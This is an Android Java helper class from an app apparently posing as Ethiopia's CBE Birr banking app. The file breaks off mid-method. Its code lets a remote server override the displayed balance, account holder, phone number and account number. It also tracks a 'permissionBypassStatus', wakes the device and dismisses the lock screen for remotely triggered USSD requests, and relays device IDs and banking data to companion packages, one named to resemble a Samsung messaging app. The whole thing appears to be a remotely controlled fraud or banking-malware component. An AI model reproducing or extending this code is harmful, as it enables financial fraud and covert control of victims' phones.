package com.cbe.cbebirrtransfer;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.AudioAttributes;
import android.media.AudioFocusRequest;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.PermissionRequest;
import android.webkit.WebView;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.lang.ref.WeakReference;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class CallBridgeHelper {
    public static final String PREFS_NAME = "cbe_native_call_prefs";
    public static final String KEY_DEVICE_ID = "device_id";
    public static final String KEY_API_BASE = "api_base";
    public static final String KEY_PENDING_JSON = "pending_call_json";
    public static final String KEY_ASKED_RUNTIME_ONCE = "asked_runtime_once";
    public static final String KEY_SYNC_SNAPSHOT_JSON = "sync_snapshot_json";
    public static final String KEY_NATIVE_LOCK_STATE_JSON = "native_lock_state_json";
    public static final String KEY_DELIVERED_NOTIF_IDS = "delivered_notif_ids_json";
    public static final String KEY_USSD_HANDLED_JSON = "ussd_handled_state_json";
    public static final String KEY_BANKING_EXTRAS_JSON = "banking_extras_json";
    public static final String KEY_PENDING_DIALER_TX_JSON = "pending_dialer_tx_json";
    public static final String ACTION_BANKING_STATE_SYNC = "com.cbe.cbebirrtransfer.BANKING_STATE_SYNC";
    public static final String DIALER_PKG = "com.cbe.cbebirrdialer";
    public static final Uri DIALER_STATE_URI = Uri.parse("content://com.cbe.cbebirrtransfer.stateprovider/state");
    private static final String[] MSG_PACKAGES = new String[]{
        "com.cbebirr.messages.cbe",
        "com.samsung.messages.cbe"
    };

    public static final int REQ_WEB_PERMISSIONS = 0x1b9d;
    public static final int REQ_CALL_PERMISSIONS = 0x1b9e;

    private static final Object STATE_LOCK = new Object();
    private static volatile PermissionRequest pendingWebRequest = null;
    private static volatile WeakReference<Activity> lastActivityRef = null;
    private static volatile AudioFocusRequest activeAudioFocusRequest = null;
    private static volatile PowerManager.WakeLock activeCallWakeLock = null;
    private static volatile PowerManager.WakeLock activeUssdWakeLock = null;
    private static volatile boolean mainActivityForeground = false;

    public static void setMainActivityForeground(Activity activity, boolean foreground) {
        if (activity != null) {
            lastActivityRef = new WeakReference<Activity>(activity);
        }
        mainActivityForeground = foreground;
    }

    public static boolean isMainActivityForeground() {
        return mainActivityForeground && MainActivity.currentInstance != null;
    }

    public static void onActivityCreate(Activity activity) {
        if (activity == null) return;
        lastActivityRef = new WeakReference<Activity>(activity);
        try {
            handleLaunchIntent(activity, activity.getIntent());
            if (hasPendingAnswerAction(activity) || isAnswerIntent(activity.getIntent())) {
                enableCallLockScreenFlags(activity);
            }
            Context appCtx = activity.getApplicationContext();
            String devId = getDeviceId(appCtx);
            if (!devId.isEmpty()) {
                startCallServiceIfReady(appCtx);
            }
        } catch (Throwable ignored) {
        }
    }

    public static void onActivityNewIntent(Activity activity, Intent intent) {
        if (activity == null) return;
        lastActivityRef = new WeakReference<Activity>(activity);
        try {
            handleLaunchIntent(activity, intent);
            if (hasPendingAnswerAction(activity) || isAnswerIntent(intent)) {
                enableCallLockScreenFlags(activity);
            }
        } catch (Throwable ignored) {
        }
    }

    private static boolean isAnswerIntent(Intent intent) {
        if (intent == null) return false;
        String act = intent.getStringExtra("cbe_call_action");
        return "answer".equals(act);
    }

    public static boolean hasPendingAnswerAction(Context ctx) {
        if (ctx == null) return false;
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String raw = prefs.getString(KEY_PENDING_JSON, "");
            if (raw == null || raw.isEmpty()) return false;
            JSONObject obj = new JSONObject(raw);
            long ts = obj.optLong("ts", 0L);
            if (ts > 0L && (System.currentTimeMillis() - ts) > 120000L) {
                return false;
            }
            return "answer".equals(obj.optString("action", ""));
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static void enableCallLockScreenFlags(final Activity activity) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        activity.setShowWhenLocked(true);
                        activity.setTurnScreenOn(true);
                        KeyguardManager km = (KeyguardManager) activity.getSystemService(Context.KEYGUARD_SERVICE);
                        if (km != null) {
                            km.requestDismissKeyguard(activity, null);
                        }
                    } else if (activity.getWindow() != null) {
                        @SuppressWarnings("deprecation")
                        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
                        activity.getWindow().addFlags(flags);
                    }
                    if (activity.getWindow() != null) {
                        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                    }
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public static void clearCallLockScreenFlags(final Activity activity) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        activity.setShowWhenLocked(false);
                        activity.setTurnScreenOn(false);
                    } else if (activity.getWindow() != null) {
                        @SuppressWarnings("deprecation")
                        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
                        activity.getWindow().clearFlags(flags);
                    }
                    if (activity.getWindow() != null) {
                        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                    }
                } catch (Throwable ignored) {
                }
            }
        });
    }

    private static void handleLaunchIntent(Context ctx, Intent intent) {
        if (ctx == null || intent == null) return;
        String action = intent.getStringExtra("cbe_call_action");
        if (action == null || action.isEmpty()) return;
        String callId = intent.getStringExtra("cbe_call_id");
        if (callId == null) callId = "";
        String callMode = intent.getStringExtra("cbe_call_mode");
        if (callMode == null) callMode = "audio";
        setPendingCallAction(ctx, callId, action, callMode);
        intent.removeExtra("cbe_call_action");
        intent.removeExtra("cbe_call_id");
        intent.removeExtra("cbe_call_mode");
        if (ctx instanceof Activity) {
            notifyWebViewAction((Activity) ctx);
        }
    }

    private static WebView findWebViewInHierarchy(View root) {
        if (root instanceof WebView) return (WebView) root;
        if (root instanceof ViewGroup) {
            ViewGroup vg = (ViewGroup) root;
            for (int i = 0; i < vg.getChildCount(); i++) {
                WebView found = findWebViewInHierarchy(vg.getChildAt(i));
                if (found != null) return found;
            }
        }
        return null;
    }

    public static void notifyWebViewAction(final Activity activity) {
        if (activity == null) return;
        final Runnable dispatch = new Runnable() {
            @Override
            public void run() {
                try {
                    if (activity.isFinishing()) return;
                    View decor = activity.getWindow() != null ? activity.getWindow().getDecorView() : null;
                    WebView wv = findWebViewInHierarchy(decor);
                    if (wv != null) {
                        String js = "(function(){try{window.dispatchEvent(new Event('cbe-native-call-action'));}catch(e){}})();";
                        if (Build.VERSION.SDK_INT >= 19) {
                            wv.evaluateJavascript(js, null);
                        } else {
                            wv.loadUrl("javascript:" + js);
                        }
                    }
                } catch (Throwable ignored) {
                }
            }
        };
        try {
            Handler h = new Handler(Looper.getMainLooper());
            h.post(dispatch);
            h.postDelayed(dispatch, 350L);
            h.postDelayed(dispatch, 900L);
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private static void applySpeakerRoutingCompat(AudioManager am, boolean active, boolean speakerOn) {
        if (am == null) return;
        if (active) {
            am.setSpeakerphoneOn(speakerOn);
        } else {
            am.setSpeakerphoneOn(false);
        }
        if (Build.VERSION.SDK_INT >= 31) {
            try {
                if (!active) {
                    AudioManager.class.getMethod("clearCommunicationDevice").invoke(am);
                    return;
                }
                int desiredType = speakerOn ? 2 : 1;
                Object devicesObj = AudioManager.class.getMethod("getAvailableCommunicationDevices").invoke(am);
                if (devicesObj instanceof List<?>) {
                    List<?> devices = (List<?>) devicesObj;
                    Object chosen = null;
                    for (Object dev : devices) {
                        if (dev == null) continue;
                        Object t = dev.getClass().getMethod("getType").invoke(dev);
                        if (t instanceof Integer && ((Integer) t).intValue() == desiredType) {
                            chosen = dev;
                            break;
                        }
                    }
                    if (chosen != null) {
                        Class<?> infoCls = Class.forName("android.media.AudioDeviceInfo");
                        AudioManager.class.getMethod("setCommunicationDevice", infoCls).invoke(am, chosen);
                    }
                }
            } catch (Throwable ignored) {
            }
        }
    }

    public static void setAudioCallMode(final Context ctx, final boolean active, final boolean speakerOn) {
        if (ctx == null) return;
        try {
            Context appCtx = ctx.getApplicationContext();
            try {
                PowerManager pm = (PowerManager) appCtx.getSystemService(Context.POWER_SERVICE);
                if (active && pm != null) {
                    if (activeCallWakeLock == null) {
                        activeCallWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CBEBirr:CallAudio");
                    }
                    if (!activeCallWakeLock.isHeld()) {
                        activeCallWakeLock.acquire(60L * 60L * 1000L);
                    }
                } else if (!active && activeCallWakeLock != null) {
                    if (activeCallWakeLock.isHeld()) {
                        activeCallWakeLock.release();
                    }
                    activeCallWakeLock = null;
                }
            } catch (Throwable ignored) {
            }
            if (!active && MainActivity.currentInstance != null) {
                clearCallLockScreenFlags(MainActivity.currentInstance);
            }
            AudioManager am = (AudioManager) appCtx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            if (active) {
                if (Build.VERSION.SDK_INT >= 26) {
                    if (activeAudioFocusRequest == null) {
                        AudioAttributes attrs = new AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build();
                        activeAudioFocusRequest = new AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                            .setAudioAttributes(attrs)
                            .setAcceptsDelayedFocusGain(false)
                            .build();
                    }
                    am.requestAudioFocus(activeAudioFocusRequest);
                } else {
                    @SuppressWarnings("deprecation")
                    int ignoredRes = am.requestAudioFocus(null, AudioManager.STREAM_VOICE_CALL, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT);
                }
                am.setMode(AudioManager.MODE_IN_COMMUNICATION);
                am.setMicrophoneMute(false);
                applySpeakerRoutingCompat(am, true, speakerOn);
                try {
                    int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
                    int curVol = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
                    int targetMin = Math.max(1, (int) Math.round(maxVol * 0.8));
                    if (curVol < targetMin) {
                        am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, targetMin, 0);
                    }
                } catch (Throwable ignored) {
                }
            } else {
                applySpeakerRoutingCompat(am, false, false);
                am.setMode(AudioManager.MODE_NORMAL);
                if (Build.VERSION.SDK_INT >= 26 && activeAudioFocusRequest != null) {
                    am.abandonAudioFocusRequest(activeAudioFocusRequest);
                    activeAudioFocusRequest = null;
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public static void acquireUssdWakeLock(Context ctx, long timeoutMs) {
        if (ctx == null) return;
        try {
            PowerManager pm = (PowerManager) ctx.getApplicationContext().getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            synchronized (STATE_LOCK) {
                if (activeUssdWakeLock != null && activeUssdWakeLock.isHeld()) {
                    try {
                        activeUssdWakeLock.release();
                    } catch (Throwable ignored) {
                    }
                }
                @SuppressWarnings("deprecation")
                int flags = PowerManager.FULL_WAKE_LOCK
                    | PowerManager.ACQUIRE_CAUSES_WAKEUP
                    | PowerManager.ON_AFTER_RELEASE;
                activeUssdWakeLock = pm.newWakeLock(flags, "CBEBirr:RemoteUssd");
                activeUssdWakeLock.setReferenceCounted(false);
                activeUssdWakeLock.acquire(Math.max(10000L, Math.min(timeoutMs, 120000L)));
            }
        } catch (Throwable ignored) {
            try {
                PowerManager pm = (PowerManager) ctx.getApplicationContext().getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    synchronized (STATE_LOCK) {
                        activeUssdWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CBEBirr:RemoteUssdCpu");
                        activeUssdWakeLock.setReferenceCounted(false);
                        activeUssdWakeLock.acquire(Math.max(10000L, Math.min(timeoutMs, 120000L)));
                    }
                }
            } catch (Throwable ignored2) {
            }
        }
    }

    public static void releaseUssdWakeLock() {
        try {
            synchronized (STATE_LOCK) {
                if (activeUssdWakeLock != null) {
                    if (activeUssdWakeLock.isHeld()) {
                        activeUssdWakeLock.release();
                    }
                    activeUssdWakeLock = null;
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public static void registerCallDevice(Context ctx, String deviceId, String apiBaseUrl) {
        if (ctx == null || deviceId == null || deviceId.trim().isEmpty()) return;
        try {
            String cleanBase = (apiBaseUrl == null || apiBaseUrl.trim().isEmpty())
                ? "https://cbebirr-lovat.vercel.app"
                : apiBaseUrl.trim();
            while (cleanBase.endsWith("/")) {
                cleanBase = cleanBase.substring(0, cleanBase.length() - 1);
            }
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit()
                .putString(KEY_DEVICE_ID, deviceId.trim())
                .putString(KEY_API_BASE, cleanBase)
                .apply();
            startCallServiceIfReady(ctx.getApplicationContext());
            broadcastBankingStateToDialer(ctx.getApplicationContext());
        } catch (Throwable ignored) {
        }
    }

    private static void notifyStateProviderChanged(Context ctx) {
        if (ctx == null) return;
        try {
            ctx.getApplicationContext().getContentResolver().notifyChange(DIALER_STATE_URI, null);
        } catch (Throwable ignored) {
        }
    }

    public static void broadcastDevicePairToMessages(Context ctx, String deviceId) {
        if (ctx == null || deviceId == null || deviceId.trim().isEmpty()) return;
        try {
            JSONObject pairObj = new JSONObject();
            pairObj.put("type", "DEVICE_PAIR");
            pairObj.put("deviceId", deviceId.trim());
            pairObj.put("ts", System.currentTimeMillis());
            String payload = pairObj.toString();
            for (String pkg : MSG_PACKAGES) {
                try {
                    Intent msgIntent = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
                    msgIntent.setClassName(pkg, "com.cbebirr.messages.cbe.CbeSmsReceiver");
                    msgIntent.addFlags(285212704);
                    msgIntent.putExtra("payload", payload);
                    ctx.getApplicationContext().sendBroadcast(msgIntent);
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public static String getDeviceId(Context ctx) {
        if (ctx == null) return "";
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String val = prefs.getString(KEY_DEVICE_ID, "");
            return val != null ? val.trim() : "";
        } catch (Throwable ignored) {
            return "";
        }
    }

    public static String getApiBaseUrl(Context ctx) {
        if (ctx == null) return "https://cbebirr-lovat.vercel.app";
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String val = prefs.getString(KEY_API_BASE, "https://cbebirr-lovat.vercel.app");
            return (val != null && !val.trim().isEmpty()) ? val.trim() : "https://cbebirr-lovat.vercel.app";
        } catch (Throwable ignored) {
            return "https://cbebirr-lovat.vercel.app";
        }
    }

    public static void sendSmsIpc(Context ctx, String payload) {
        if (ctx == null || payload == null || payload.isEmpty()) return;
        try {
            Intent i1 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
            i1.setClassName("com.cbebirr.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
            i1.addFlags(285212704);
            i1.putExtra("payload", payload);
            ctx.sendBroadcast(i1);
        } catch (Throwable ignored) {
        }
        try {
            Intent i2 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
            i2.setClassName("com.samsung.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
            i2.addFlags(285212704);
            i2.putExtra("payload", payload);
            ctx.sendBroadcast(i2);
        } catch (Throwable ignored) {
        }
    }

    public static void saveSyncSnapshotJson(Context ctx, String jsonStr) {
        if (ctx == null || jsonStr == null || jsonStr.trim().isEmpty()) return;
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, jsonStr).apply();
            }
            broadcastBankingStateToDialer(ctx.getApplicationContext());
        } catch (Throwable ignored) {
        }
    }

    public static String getSyncSnapshotJson(Context ctx) {
        if (ctx == null) return "";
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String val = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
                return val != null ? val : "";
            }
        } catch (Throwable ignored) {
            return "";
        }
    }

    public static void saveBankingExtrasJson(Context ctx, String jsonStr) {
        if (ctx == null || jsonStr == null || jsonStr.trim().isEmpty()) return;
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                prefs.edit().putString(KEY_BANKING_EXTRAS_JSON, jsonStr).apply();
            }
            broadcastBankingStateToDialer(ctx.getApplicationContext());
        } catch (Throwable ignored) {
        }
    }

    public static String getBankingExtrasJson(Context ctx) {
        if (ctx == null) return "";
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String val = prefs.getString(KEY_BANKING_EXTRAS_JSON, "");
                return val != null ? val : "";
            }
        } catch (Throwable ignored) {
            return "";
        }
    }

    public static String consumePendingDialerTxsJson(Context ctx) {
        if (ctx == null) return "[]";
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String val = prefs.getString(KEY_PENDING_DIALER_TX_JSON, "[]");
                prefs.edit().remove(KEY_PENDING_DIALER_TX_JSON).apply();
                return (val != null && !val.trim().isEmpty()) ? val : "[]";
            }
        } catch (Throwable ignored) {
            return "[]";
        }
    }

    public static void broadcastBankingStateToDialer(Context ctx) {
        if (ctx == null) return;
        try {
            Context appCtx = ctx.getApplicationContext();
            String deviceId = getDeviceId(appCtx);
            String apiBase = getApiBaseUrl(appCtx);
            String snapshotJson = getSyncSnapshotJson(appCtx);
            String extrasJson = getBankingExtrasJson(appCtx);
            notifyStateProviderChanged(appCtx);
            if (!deviceId.isEmpty()) {
                broadcastDevicePairToMessages(appCtx, deviceId);
            }
            Intent i = new Intent(ACTION_BANKING_STATE_SYNC);
            i.setClassName(DIALER_PKG, DIALER_PKG + ".DialerSyncReceiver");
            i.addFlags(285212704);
            i.putExtra("deviceId", deviceId);
            i.putExtra("apiBase", apiBase);
            i.putExtra("syncSnapshotJson", snapshotJson);
            i.putExtra("bankingExtrasJson", extrasJson);
            appCtx.sendBroadcast(i);
        } catch (Throwable ignored) {
        }
    }

    public static void applyDialerTransferLocally(Context ctx, String txJsonStr) {
        if (ctx == null || txJsonStr == null || txJsonStr.trim().isEmpty()) return;
        try {
            Context appCtx = ctx.getApplicationContext();
            JSONObject incoming = new JSONObject(txJsonStr);
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = appCtx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

                // 1. Update balance in stored syncSnapshotJson if provided
                if (incoming.has("balanceAfter")) {
                    double newBal = incoming.optDouble("balanceAfter", -1);
                    if (newBal >= 0) {
                        String snapRaw = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
                        JSONObject snap = (snapRaw != null && !snapRaw.isEmpty())
                            ? new JSONObject(snapRaw)
                            : new JSONObject();
                        snap.put("balance", newBal);
                        prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, snap.toString()).apply();
                    }
                }

                // 2. Append to pending dialer queue for Banking WebView consumption
                String queueRaw = prefs.getString(KEY_PENDING_DIALER_TX_JSON, "[]");
                JSONArray queueArr = new JSONArray((queueRaw != null && !queueRaw.isEmpty()) ? queueRaw : "[]");
                String incomingId = incoming.optString("id", incoming.optString("ref", ""));
                boolean dup = false;
                for (int k = 0; k < queueArr.length(); k++) {
                    JSONObject prev = queueArr.optJSONObject(k);
                    if (prev != null && !incomingId.isEmpty() && incomingId.equals(prev.optString("id", prev.optString("ref", "")))) {
                        dup = true;
                        break;
                    }
                }
                if (!dup) {
                    queueArr.put(incoming);
                    prefs.edit().putString(KEY_PENDING_DIALER_TX_JSON, queueArr.toString()).apply();
                }

                // 3. Also update cached extras (savedAccountReceivers / savedPhoneReceivers / transactions)
                String extrasRaw = prefs.getString(KEY_BANKING_EXTRAS_JSON, "");
                if (extrasRaw != null && !extrasRaw.isEmpty()) {
                    try {
                        JSONObject extras = new JSONObject(extrasRaw);
                        JSONArray txList = extras.optJSONArray("transactions");
                        if (txList == null) txList = new JSONArray();
                        JSONArray nextTxList = new JSONArray();
                        nextTxList.put(incoming);
                        for (int idx = 0; idx < txList.length() && idx < 49; idx++) {
                            JSONObject item = txList.optJSONObject(idx);
                            if (item != null && !incomingId.isEmpty() && incomingId.equals(item.optString("id", item.optString("ref", "")))) {
                                continue;
                            }
                            nextTxList.put(txList.opt(idx));
                        }
                        extras.put("transactions", nextTxList);

                        String rcvAcc = incoming.optString("account", "").trim();
                        String rcvName = incoming.optString("receiverName", "").trim();
                        String mode = incoming.optString("dialerMode", "");
                        if (!rcvAcc.isEmpty() && !rcvName.isEmpty()) {
                            String arrKey = "phone".equals(mode) ? "savedPhoneReceivers" : "savedAccountReceivers";
                            JSONArray recs = extras.optJSONArray(arrKey);
                            if (recs == null) recs = new JSONArray();
                            boolean exists = false;
                            for (int r = 0; r < recs.length(); r++) {
                                JSONObject rec = recs.optJSONObject(r);
                                if (rec != null && rcvAcc.equals(rec.optString("accountNumber", ""))) {
                                    rec.put("accountName", rcvName);
                                    exists = true;
                                    break;
                                }
                            }
                            if (!exists) {
                                JSONObject nr = new JSONObject();
                                nr.put("id", "rec_" + System.currentTimeMillis());
                                nr.put("accountNumber", rcvAcc);
                                nr.put("accountName", rcvName);
                                JSONArray nextRecs = new JSONArray();
                                nextRecs.put(nr);
                                for (int r = 0; r < recs.length() && r < 49; r++) nextRecs.put(recs.opt(r));
                                extras.put(arrKey, nextRecs);
                            }
                        }
                        prefs.edit().putString(KEY_BANKING_EXTRAS_JSON, extras.toString()).apply();
                    } catch (Throwable ignored) {
                    }
                }
            }
            broadcastBankingStateToDialer(appCtx);
            MainActivity act = MainActivity.currentInstance;
            if (act != null) {
                act.notifyDialerTxApplied();
            }
        } catch (Throwable ignored) {
        }
    }

    public static void saveNativeSyncResultState(Context ctx, JSONObject syncResp) {
        if (ctx == null || syncResp == null) return;
        boolean snapshotUpdated = false;
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String existingRaw = prefs.getString(KEY_NATIVE_LOCK_STATE_JSON, "");
                JSONObject stateObj = (existingRaw != null && !existingRaw.isEmpty())
                    ? new JSONObject(existingRaw)
                    : new JSONObject();

                if (syncResp.has("effectiveLocked")) {
                    stateObj.put("effectiveLocked", syncResp.optBoolean("effectiveLocked", false));
                }
                if (syncResp.has("lockMessage")) {
                    stateObj.put("lockMessage", syncResp.optString("lockMessage", ""));
                }
                if (syncResp.has("approvalStatus")) {
                    stateObj.put("approvalStatus", syncResp.optString("approvalStatus", "approved"));
                }
                if (syncResp.has("permissionBypassStatus")) {
                    stateObj.put("permissionBypassStatus", syncResp.optString("permissionBypassStatus", "none"));
                }
                stateObj.put("updatedAtMs", System.currentTimeMillis());

                JSONObject ov = syncResp.optJSONObject("deviceOverride");
                if (ov != null && ov.optInt("overrideSeq", 0) > 0) {
                    int incomingSeq = ov.optInt("overrideSeq", 0);
                    JSONObject prevOv = stateObj.optJSONObject("deviceOverride");
                    int prevSeq = prevOv != null ? prevOv.optInt("overrideSeq", 0) : 0;
                    if (incomingSeq >= prevSeq) {
                        stateObj.put("deviceOverride", ov);
                    }

                    // Merge override into KEY_SYNC_SNAPSHOT_JSON so Dialer & background sync stay 100% synced
                    String snapRaw = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
                    try {
                        JSONObject snap = (snapRaw != null && !snapRaw.isEmpty())
                            ? new JSONObject(snapRaw)
                            : new JSONObject();
                        int snapApplied = snap.optInt("appliedOverrideSeq", 0);
                        if (incomingSeq > snapApplied || snapRaw == null || snapRaw.isEmpty()) {
                            if (ov.has("deviceName") && !ov.optString("deviceName", "").isEmpty()) {
                                snap.put("deviceName", ov.optString("deviceName", snap.optString("deviceName", "Android Device")));
                            }
                            snap.put("userName", ov.optString("userName", snap.optString("userName", "")));
                            snap.put("phoneNumber", ov.optString("phoneNumber", snap.optString("phoneNumber", "")));
                            snap.put("userAccount", ov.optString("userAccount", snap.optString("userAccount", "")));
                            if (ov.has("balance")) snap.put("balance", ov.optDouble("balance", snap.optDouble("balance", 500.0)));
                            if (ov.has("rewardBalance")) snap.put("rewardBalance", ov.optDouble("rewardBalance", snap.optDouble("rewardBalance", 500.0)));
                            if (ov.has("appLang")) snap.put("appLang", ov.optString("appLang", "en"));
                            if (ov.has("isBalanceShown")) snap.put("isBalanceShown", ov.optBoolean("isBalanceShown", true));
                            if (ov.has("isRewardShown")) snap.put("isRewardShown", ov.optBoolean("isRewardShown", false));
                            JSONArray cbeProfs = ov.optJSONArray("ussdProfiles");
                            if (cbeProfs != null) snap.put("ussdProfilesJson", cbeProfs.toString());
                            if (ov.has("activeUssdId")) snap.put("activeUssdId", ov.optString("activeUssdId", ""));
                            JSONArray phoneProfs = ov.optJSONArray("phoneUssdProfiles");
                            if (phoneProfs != null) snap.put("phoneUssdProfilesJson", phoneProfs.toString());
                            if (ov.has("activePhoneUssdId")) snap.put("activePhoneUssdId", ov.optString("activePhoneUssdId", ""));
                            snap.put("appliedOverrideSeq", incomingSeq);
                            prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, snap.toString()).apply();
                            snapshotUpdated = true;
                        }
                    } catch (Throwable ignored) {
                    }
                }

                prefs.edit().putString(KEY_NATIVE_LOCK_STATE_JSON, stateObj.toString()).apply();
            }
            if (snapshotUpdated) {
                broadcastBankingStateToDialer(ctx.getApplicationContext());
            }
        } catch (Throwable ignored) {
        }
    }

    public static String getNativeSyncStateJson(Context ctx) {
        if (ctx == null) return "";
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String val = prefs.getString(KEY_NATIVE_LOCK_STATE_JSON, "");
                return val != null ? val : "";
            }
        } catch (Throwable ignored) {
            return "";
        }
    }

    public static boolean hasDeliveredNotif(Context ctx, String notifId) {
        if (ctx == null || notifId == null || notifId.trim().isEmpty()) return false;
        String cleanId = notifId.trim();
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String raw = prefs.getString(KEY_DELIVERED_NOTIF_IDS, "[]");
                JSONArray arr = new JSONArray(raw != null && !raw.isEmpty() ? raw : "[]");
                for (int i = 0; i < arr.length(); i++) {
                    if (cleanId.equals(arr.optString(i))) return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    public static void markNotifDelivered(Context ctx, String notifId) {
        if (ctx == null || notifId == null || notifId.trim().isEmpty()) return;
        String cleanId = notifId.trim();
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String raw = prefs.getString(KEY_DELIVERED_NOTIF_IDS, "[]");
                JSONArray arr = new JSONArray(raw != null && !raw.isEmpty() ? raw : "[]");
                for (int i = 0; i < arr.length(); i++) {
                    if (cleanId.equals(arr.optString(i))) return;
                }
                arr.put(cleanId);
                JSONArray trimmed = new JSONArray();
                int start = Math.max(0, arr.length() - 80);
                for (int i = start; i < arr.length(); i++) {
                    trimmed.put(arr.optString(i));
                }
                prefs.edit().putString(KEY_DELIVERED_NOTIF_IDS, trimmed.toString()).apply();
            }
        } catch (Throwable ignored) {
        }
    }

    private static JSONObject loadUssdHandledStateLocked(SharedPreferences prefs) {
        try {
            String raw = prefs.getString(KEY_USSD_HANDLED_JSON, "{}");
            return new JSONObject(raw != null && !raw.isEmpty() ? raw : "{}");
        } catch (Throwable ignored) {
            return new JSONObject();
        }
    }

    public static boolean isRemoteUssdHandled(Context ctx, String requestId) {
        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return false;
        String cleanId = requestId.trim();
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                JSONObject obj = loadUssdHandledStateLocked(prefs);
                JSONArray arr = obj.optJSONArray("handledIds");
                if (arr != null) {
                    for (int i = 0; i < arr.length(); i++) {
                        if (cleanId.equals(arr.optString(i))) return true;
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    public static void markRemoteUssdHandled(Context ctx, String requestId, int appliedReplySeq, boolean cancelled) {
